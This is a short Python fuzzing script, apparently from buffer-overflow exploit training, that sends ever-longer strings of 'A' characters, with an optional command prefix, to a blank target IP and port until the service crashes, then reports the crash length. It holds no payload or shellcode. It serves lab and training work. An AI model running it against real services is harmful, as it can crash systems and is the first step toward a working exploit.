import socket, sys, time

target_ip = ""  # Target IP address
target_port = 0 # Target port number
timeout = 5
prefix = ""  # If the service expects a command prefix like "OVERFLOW1 ", set it here

buffer = prefix + "A" * 100  # Start with 100 bytes

while True:
    try:
        print(f"Fuzzing with {len(buffer) - len(prefix)} bytes...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((target_ip, target_port))
            s.recv(1024)
            s.send(bytes(buffer, "latin-1"))
            s.recv(1024)
    except Exception as e:
        print(f"[!] Fuzzing crashed at {len(buffer) - len(prefix)} bytes")
        sys.exit(0)
    buffer += "A" * 100
    time.sleep(1)
